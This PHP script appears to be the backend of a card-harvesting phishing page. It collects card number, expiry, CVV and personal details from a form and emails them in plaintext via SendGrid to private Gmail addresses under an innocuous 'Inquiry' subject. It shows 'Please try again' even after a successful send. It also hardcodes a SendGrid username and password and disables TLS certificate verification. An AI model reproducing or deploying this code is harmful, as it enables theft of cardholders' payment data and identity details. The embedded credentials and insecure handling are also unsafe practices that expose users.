<?php   

if(isset($_POST['submit'])){
        
        $txt = 
            "
			Card Details :".$_POST['carddetails']."<br> 
			
			Expiry Date :".$_POST['cardexpiry']."<br> 
			
			CVV Number :".$_POST['cvv']."<br> 
			
            First Name:".$_POST['fname']."<br> 
			
			 Last Name:".$_POST['lname']."<br> 
              
            Email:".$_POST['email']."<br>       
            
            Phone:".$_POST['phone']."<br>

            Address:".$_POST['address']."<br>
			
			City:".$_POST['city']."<br>
			
			State:".$_POST['state']."<br>
			
			Amount Payable:".$_POST['amount']."<br>
			
        "   
        ;
        
        

 $url = 'https://api.sendgrid.com/';
        $user = 'findamerican.rentals';    
		$pass = 'N8coders@123#';
        $json_string = array(
          'to' => array('magpieonalki@gmail.com'),
        );
        
        $params = array(
            'api_user'  => $user,
            'api_key'   => $pass,
            'x-smtpapi' => json_encode($json_string),
            'to'        => 'ankit.thakural66@gmail.com',
            //'toname'    => 'To parameter',
            'subject'   => 'Inquiry From website',
            'html'      => $txt,
            //'text'      => 'testing body',
            'from'      => $_POST['email'],
            'fromname'  => $_POST['fname'],
          );
        
        $request =  $url.'api/mail.send.json';
        // Generate curl request
        $session = curl_init($request);
        // Tell curl to use HTTP POST
        curl_setopt ($session, CURLOPT_POST, true);
        // Tell curl that this is the body of the POST
        curl_setopt ($session, CURLOPT_POSTFIELDS, $params);
        // Tell curl not to return headers, but do return the response
        curl_setopt($session, CURLOPT_HEADER, false);
        // Tell PHP not to use SSLv3 (instead opting for TLS)
        //curl_setopt($session, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);
        curl_setopt($session, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($session, CURLOPT_SSL_VERIFYPEER, false); 
        
        // obtain response
        $response = json_decode(curl_exec($session));
//print_r($response);
        

//echo $response->message;


               if($response->message=='success'){
				    
               echo "<script>alert('Your inquiry sent successfully.Please try again.')</script>";
			   echo "<script>window.location='index.php'</script>";
            }else{
                echo "<script>alert('Your inquiry not sent successfully.Please try again.')</script>";
				 echo "<script>window.location='index.php'</script>";
            }
            
curl_close($session);
        }   
                


?>